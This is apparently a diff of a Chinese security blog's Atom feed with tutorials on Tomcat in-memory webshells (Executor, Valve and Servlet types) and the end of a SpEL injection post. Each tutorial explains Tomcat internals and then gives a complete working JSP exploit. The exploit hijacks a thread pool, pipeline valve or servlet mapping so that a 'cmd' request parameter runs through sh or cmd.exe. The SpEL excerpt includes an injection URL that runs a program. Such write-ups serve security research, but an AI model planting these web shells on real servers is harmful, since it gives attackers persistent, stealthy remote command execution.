+<p>再次注入<code>http://localhost:8080/spel?cmd=T(java.lang.Runtime).getRuntime().exec(%27calc%27)</code><br>
+控制台报错，getValue方法=&gt;<code>Type cannot be found 'java.lang.Runtime'</code></p>
+<h1 id="0x05-参考文章">0x05 参考文章</h1>
+<p>https://www.freebuf.com/articles/web/328282.html<br>
+https://www.freebuf.com/vuls/344673.html<br>
+https://www.freebuf.com/vuls/338941.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Executor内存马]]></title>
+        <id>https://p4d0rn.github.io/post/executor-Memory-Trojan/</id>
+        <link href="https://p4d0rn.github.io/post/executor-Memory-Trojan/">
+        </link>
+        <updated>2022-10-16T07:04:14.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-connector再叙">0x01 Connector再叙</h1>
+<p>在Tomcat架构中，我们讲到Connector用于和客户端交互（socket通信），承担了HTTP服务器的功能。<br>
+Connector主要由ProtocolHandler与Adapter构成。<br>
+<img src="https://p4d0rn.github.io/post-images/1665904000751.png" alt="" loading="lazy"><br>
+Connector就是依靠ProtocolHandler来处理网络连接和应用层协议。<br>
+ProtocolHandler主要由Endpoint和Processor构造。</p>
+<p>EndPoint：通信监听的接口，是具体的 Socket 接收和发送处理器，是对传输层的抽象<br>
+因此 EndPoint 是用来实现 TCP/IP 协议的。</p>
+<ul>
+<li>LimitLatch：连接控制器，负责控制最大的连接数</li>
+<li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li>
+<li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li>
+<li>SocketProcessor：可以看成是一个被封装的任务类</li>
+<li>Executor：Tomcat自己扩展的线程池，用来执行任务类</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://p4d0rn.github.io/post-images/1665906320505.png" alt="" loading="lazy"></figure>
+<p>其中Executor组件，用于组件中的共享线程池。Executor由Service维护，一个Service中的所有容器都可以共享此Executor。</p>
+<h1 id="0x02-过程浅析">0x02 过程浅析</h1>
+<p><code>org.apache.tomcat.util.net.NioEndpoint#run</code><br>
+代码过于复杂，这里就不放了<br>
+调用了<code>processKey(sk, socketWrapper);</code><br>
+接着调用了<code>processSocket</code><br>
+<img src="https://p4d0rn.github.io/post-images/1665908004402.png" alt="" loading="lazy"><br>
+这里的executor是endpoint自己启动的<code>ThreadPoolExecutor</code>类<br>
+接着调用了<code>org.apache.tomcat.util.threads.ThreadPoolExecutor#execute</code></p>
+<p>我们可以创建一个恶意的Executor类继承ThreadPoolExecutor，并重写其中的execute方法，那么在调用该方法的时候将会执行我们的恶意代码。</p>
+<p>接着就是思考怎么将其<code>Executor executor = getExecutor();</code>替换成我们的恶意Executor<br>
+注意到<code>org.apache.tomcat.util.net.AbstractEndpoint</code>这个类<br>
+也就是调用<code>processSocket</code>的这个类中有<code>setExecutor</code>方法</p>
+<pre><code class="language-java">    public void setExecutor(Executor executor) {
+        this.executor = executor;
+        this.internalExecutor = (executor == null);
+    }
+</code></pre>
+<p>编写恶意Executor之前，我们需注意到Connector这个组件是在Servlet之前的，其后面封装的ServletRequest和ServletResponse我们是不能直接获取的，那就对应不了本次请求的线程了。</p>
+<p><code>org.apache.catalina.connector.Response</code>继承了<code>HttpServletResponse</code>类<br>
+<img src="https://p4d0rn.github.io/post-images/1665909056681.png" alt="" loading="lazy"><br>
+可以通过这些方法来将数据回显出去。</p>
+<p>至于请求参数的获取，也就是我们传入的?cmd，有点复杂<br>
+<code>((HeapByteBuffer)((Http11InputBuffer)((NioChannel)socketWrapper.nioChannels.stack[0]).appReadBufHandler).byteBuffer).hb</code><br>
+<img src="https://p4d0rn.github.io/post-images/1665910683560.png" alt="" loading="lazy"><br>
+调试可知这里存在URL信息</p>
+<h1 id="0x03-exp">0x03 EXP</h1>
+<p>死马，后面再研究</p>
+<pre><code class="language-jsp">&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+&lt;%!
+    public Object getField(Object obj, String field) {
+        // 递归获取类的及其父类的属性
+        Class clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                Field declaredField = clazz.getDeclaredField(field);
+                declaredField.setAccessible(true);
+                return declaredField.get(obj);
+            } catch (Exception e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        return null;
+    }
+
+    public Object getNioEndpoint() {
+        // 获取当前线程的所有线程
+        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);
+        for (Thread thread : threads) {
+            try {
+                // 需要获取线程的特征包含Acceptor
+                if (thread.getName().contains(&quot;Acceptor&quot;)) {
+                    Object target = getField(thread, &quot;target&quot;);
+                    Object nioEndpoint = getField(target, &quot;this$0&quot;);
+                    return nioEndpoint;
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+                continue;
+            }
+        }
+        // 没有获取到对应Endpoint，返回一个空对象
+        return new Object();
+    }
+
+    class executorEvil extends ThreadPoolExecutor {
+        public executorEvil(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
+        }
+        public String getRequest() {
+            try {
+                // 通过调用getNioEndpoint方法获取到NioEndpoint对象
+                Object nioEndpoint = getNioEndpoint();
+                // 获取到stack数组
+                Object[] objects = (Object[]) getField(getField(nioEndpoint, &quot;nioChannels&quot;), &quot;stack&quot;);
+                // 获取到Buffer
+                ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], &quot;appReadBufHandler&quot;), &quot;byteBuffer&quot;);
+                String req = new String(heapByteBuffer.array(), &quot;UTF-8&quot;);
+                // 分割出command
+                String cmd = req.substring(req.indexOf(&quot;cmd&quot;) + &quot;cmd&quot;.length() + 1, req.indexOf(&quot;r&quot;, req.indexOf(&quot;cmd&quot;)) - 1);
+                return cmd;
+            } catch (Exception e) {
+                e.printStackTrace();
+                return null;
+            }
+        }
+        // 获取命令执行返回的回显结果
+        public void getResponse(byte[] res) {
+            try {
+                // 获取NioEndpoint对象
+                Object nioEndpoint = getNioEndpoint();
+                // 获取线程中的response对象
+                ArrayList processors = (ArrayList) getField(getField(getField(nioEndpoint, &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;);
+                // 遍历获取response
+                for (Object processor : processors) {
+                    RequestInfo requestInfo = (RequestInfo) processor;
+                    // 获取到封装在req的response
+                    Response response = (Response) getField(getField(requestInfo, &quot;req&quot;), &quot;response&quot;);
+                    // 将执行的结果写入response中
+                    response.addHeader(&quot;Execute-result&quot;, new String(res, &quot;UTF-8&quot;));
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public void execute(Runnable command) {
+            // 获取command
+            String cmd = getRequest();
+            try {
+                String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;windows&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};
+                byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;A&quot;).next().getBytes();
+                getResponse(result);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            this.execute(command, 0L, TimeUnit.MILLISECONDS);
+        }
+    }
+%&gt;
+
+&lt;%
+    NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();
+    System.out.println(&quot;aaaaa&quot;);
+    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;);
+    System.out.println(&quot;hhhhh&quot;);
+    executorEvil exe = new executorEvil(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+    System.out.println(&quot;wwwww&quot;);
+    nioEndpoint.setExecutor(exe);
+%&gt;
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Tomcat内存马_Valve型]]></title>
+        <id>https://p4d0rn.github.io/post/Tomcat-Memory-Trojan-Valve/</id>
+        <link href="https://p4d0rn.github.io/post/Tomcat-Memory-Trojan-Valve/">
+        </link>
+        <updated>2022-10-16T05:06:43.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-tomcat管道机制">0x01 Tomcat管道机制</h1>
+<p>和之前三种内存马（Listener -&gt; Filter -&gt; Servlet）不同，Valve是运行在Pipeline层面的。<br>
+因此要先了解Tomcat的管道机制。</p>
+<p>当 Tomcat 接收到客户端请求时，首先通过Connector进行解析成ServletRequest，然后发送到Container进行处理。Container下面有四个子容器，Engine、Host、Context、Wrapper，这四个组件不是平行的，而是父子关系。</p>
+<p>消息在这四个子容器中层层传递，最终发送给Servlet进行处理。这个过程就涉及到了Tomcat管道机制。<br>
+管道即Pipeline，Valve译为阀门，Valve用于配合Pipeline的工作。<br>
+我们传递的信息就像水流，在Pipeline里面流动。通过Valve，可以让水流流向不同的Pipeline，过滤水流的杂质。对比SpringMVC的拦截器，Pipeline 就相当于拦截器链，而valve就相当于拦截器</p>
+<p>下面是Pipeline的示意图：<br>
+<img src="https://p4d0rn.github.io/post-images/1665897612924.png" alt="" loading="lazy"><br>
+Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），它在业务上面的表现是封装了具体的请求处理和输出响应。</p>
+<p>四大组件 Engine、Host、Context 以及 Wrapper 都有其对应的 Valve 类</p>
+<ul>
+<li><code>StandardEngineValve</code></li>
+<li><code>StandardHostValve</code></li>
+<li><code>StandardContextValve</code></li>
+<li><code>StandardWrapperValve</code><br>
+他们同时维护一个 StandardPipeline 实例</li>
+</ul>
+<h1 id="0x02-流程分析">0x02 流程分析</h1>
+<p>下面基于Tomcat 9.0.60 会和Tomcat 8 有稍微差异</p>
+<p>Pipeline接口中存在<code>addValve</code>方法，他的实现类<code>StandardPipeline</code>实现了这个方法<br>
+<code>org.apache.catalina.core.StandardPipeline#addValve</code></p>
+<pre><code class="language-java">    public void addValve(Valve valve) {
+
+        // Validate that we can add this Valve
+        if (valve instanceof Contained) {
+            ((Contained) valve).setContainer(this.container);
+        }
+
+        // Start the new component if necessary
+        if (getState().isAvailable()) {
+            if (valve instanceof Lifecycle) {
+                try {
+                    ((Lifecycle) valve).start();
+                } catch (LifecycleException e) {
+                    log.error(sm.getString(&quot;standardPipeline.valve.start&quot;), e);
+                }
+            }
+        }
+
+        // Add this Valve to the set associated with this Pipeline
+        if (first == null) {
+            first = valve;
+            valve.setNext(basic);
+        } else {
+            Valve current = first;
+            while (current != null) {
+                if (current.getNext() == basic) {
+                    current.setNext(valve);
+                    valve.setNext(basic);
+                    break;
+                }
+                current = current.getNext();
+            }
+        }
+
+        container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);
+    }
+</code></pre>
+<p><code>org.apache.catalina.core.ContainerBase#getPipeline</code>用于获取当前容器的Pipeline<br>
+<img src="https://p4d0rn.github.io/post-images/1665898521372.png" alt="" loading="lazy"></p>
+<p>因此我们通过<code>StandardContext.getPipeline()</code>获取<code>StandardPipeline</code><br>
+再通过<code>StandardPipeline.addValve()</code>添加恶意Valve</p>
+<p><code>Valve</code>接口中定义了<code>invoke</code>方法。我们只需在运行时向 Engine/Host/Context/Wrapper  这四种 Container 组件中的任意一个的pipeline 中插入一个我们自定义的 valve，就能在其中对相应的请求进行拦截，执行我们想要的功能。</p>
+<h1 id="0x03-exp">0x03 EXP</h1>
+<pre><code class="language-jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;javax.servlet.*&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
+&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;
+
+&lt;%
+    class MyValve extends ValveBase {
+        @Override
+        public void invoke(Request request, Response response) throws IOException, ServletException {
+            try {
+                String cmd = request.getParameter(&quot;cmd&quot;);
+                boolean isLinux = true;
+                String osTyp = System.getProperty(&quot;os.name&quot;);
+                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                    isLinux = false;
+                }
+                String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+                String output = s.hasNext() ? s.next() : &quot;&quot;;
+                PrintWriter out = response.getWriter();
+                out.println(output);
+                out.flush();
+                out.close();
+            } catch (Exception e) {
+            } } }%&gt;
+
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+    standardContext.getPipeline().addValve(new MyValve());
+    out.println(&quot;inject success&quot;);
+%&gt;
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Tomcat内存马_Servlet型]]></title>
+        <id>https://p4d0rn.github.io/post/Tomcat-Memory-Trojan-Servlet/</id>
+        <link href="https://p4d0rn.github.io/post/Tomcat-Memory-Trojan-Servlet/">
+        </link>
+        <updated>2022-10-16T02:12:46.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-servlet初体验">0x01 Servlet初体验</h1>
+<p>引入依赖</p>
+<pre><code class="language-xml">        &lt;dependency&gt;
+            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
+            &lt;version&gt;4.0.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+            &lt;version&gt;9.0.60&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>自定义Servlet</p>
+<pre><code class="language-java">package servlets;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.PrintWriter;
+
+public class Test extends HttpServlet {
+        @Override
+    public void init() throws ServletException {
+        System.out.println(&quot;init....&quot;);
+    }
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        PrintWriter writer = resp.getWriter();
+        writer.write(&quot;Hello World&quot;);
+    }
+}
+</code></pre>
+<p>注册Servlet</p>
+<pre><code class="language-xml">    &lt;servlet&gt;
+            &lt;servlet-name&gt;Test&lt;/servlet-name&gt;
+            &lt;servlet-class&gt;servlets.Test&lt;/servlet-class&gt;
+            &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+            &lt;servlet-name&gt;Test&lt;/servlet-name&gt;
+            &lt;url-pattern&gt;/test&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+</code></pre>
+<p>访问/test  返回页面Hello World</p>
+<h1 id="0x02-流程分析">0x02 流程分析</h1>
+<p>在<code>init</code>处下断点，观察调用栈<br>
+<code>org.apache.catalina.core.StandardContext#startInternal</code> (Tomcat8这里会不太一样)<br>
+<code>loadOnStartup(findChildren())</code><br>
+<code>findChildren()</code>把所有Wrapper传入<code>loadOnStartup</code>进行处理</p>
+<p><code>org.apache.catalina.core.StandardContext#loadOnStartup</code></p>
+<pre><code class="language-java">    public boolean loadOnStartup(Container children[]) {
+        // Collect &quot;load on startup&quot; servlets that need to be initialized
+        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
+        for (Container child : children) {
+            Wrapper wrapper = (Wrapper) child;
+            int loadOnStartup = wrapper.getLoadOnStartup();
+            if (loadOnStartup &lt; 0) {
+                continue;
+            }
+            Integer key = Integer.valueOf(loadOnStartup);
+            ArrayList&lt;Wrapper&gt; list = map.get(key);
+            if (list == null) {
+                list = new ArrayList&lt;&gt;();
+                map.put(key, list);
+            }
+            list.add(wrapper);
+        }
+
+        // Load the collected &quot;load on startup&quot; servlets
+        for (ArrayList&lt;Wrapper&gt; list : map.values()) {
+            for (Wrapper wrapper : list) {
+                try {
+                    wrapper.load();
+                }
+        // ....
+</code></pre>
+<p>之前讲Tomcat架构的时候提到，一个 Wrapper 对应一个 Servlet。负责管理 Servlet ，包括 Servlet 的装载、初始化、执行以及资源回收。<br>
+这里的<code>wrapper.load()</code>应该就对应着Servlet的动态装载</p>
+<p>每个Servlet的启动顺序在web.xml中<br>
+如果没有声明 load-on-startup 属性（默认为-1），则该Servlet不会被动态添加到容器</p>
+<p>跟进<code>wrapper.load()</code> =&gt;  <code>loadServlet()</code><br>
+<img src="https://p4d0rn.github.io/post-images/1665889247887.png" alt="" loading="lazy"><br>
+可以看到这里是通过获取servletClass来装载Servlet<br>
+完成装载后，进行初始化，根据请求进行调用，最终销毁</p>
+<blockquote>
+<p>装载：启动服务器时加载Servlet的实例</p>
+</blockquote>
+<blockquote>
+<p>初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作由init()方法负责执行完成</p>
+</blockquote>
+<blockquote>
+<p>调用：即每次调用Servlet的service()，从第一次到以后的多次访问，都是只是调用doGet()或doPost()方法</p>
+</blockquote>
+<blockquote>
+<p>销毁：停止服务器时调用destroy()方法，销毁实例</p>
+</blockquote>
+<p><code>Wrapper</code>是<code>findChildren()</code>遍历的来的，去看看<code>findChildren()</code>所在类有无<code>addChild()</code>之类的用于添加<code>Wrapper</code>的方法</p>
+<p><code>org.apache.catalina.core.ContainerBase#addChild</code></p>
+<pre><code class="language-java">        public void addChild(Container child) {
+            if (Globals.IS_SECURITY_ENABLED) {
+                PrivilegedAction&lt;Void&gt; dp =
+                    new PrivilegedAddChild(child);
+                AccessController.doPrivileged(dp);
+            } else {
+                addChildInternal(child);
+            }
+        }
+</code></pre>
+<p>跟进<code>addChildInternal(child)</code><br>
+<img src="https://p4d0rn.github.io/post-images/1665890319840.png" alt="" loading="lazy"></p>
+<p>实际上<code>StandardContext</code>重写了父类<code>ContainerBase</code>的<code>addChild</code>方法<br>
+<img src="https://p4d0rn.github.io/post-images/1665890631374.png" alt="" loading="lazy"><br>
+先调用父类的<code>addChild</code>，接着进行访问jsp的处理</p>
+<h1 id="0x03-exp">0x03 EXP</h1>
+<pre><code class="language-jsp">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
+&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;
+&lt;%!
+    Servlet servlet = new Servlet() {
+        @Override
+        public void init(ServletConfig servletConfig) throws ServletException {
+
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            boolean isLinux = true;
+            String osTyp = System.getProperty(&quot;os.name&quot;);
+            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                isLinux = false;
+            }
+            String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+            Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+            String output = s.hasNext() ? s.next() : &quot;&quot;;
+            PrintWriter out = servletResponse.getWriter();
+            out.println(output);
+            out.flush();
+            out.close();
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+
+        }
+    };
+%&gt;
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext stdcontext = (StandardContext) req.getContext();
+%&gt;
+&lt;%
+    Wrapper newWrapper = stdcontext.createWrapper();
+    String name = servlet.getClass().getSimpleName();
+    newWrapper.setName(name);
+    newWrapper.setLoadOnStartup(1);
+    newWrapper.setServlet(servlet);
+    newWrapper.setServletClass(servlet.getClass().getName());
+%&gt;
+&lt;%
+    stdcontext.addChild(newWrapper);
+    stdcontext.addServletMappingDecoded(&quot;/evil&quot;, name);
+%&gt;
+</code></pre>
+]]></content>
+    </entry>
+</feed>
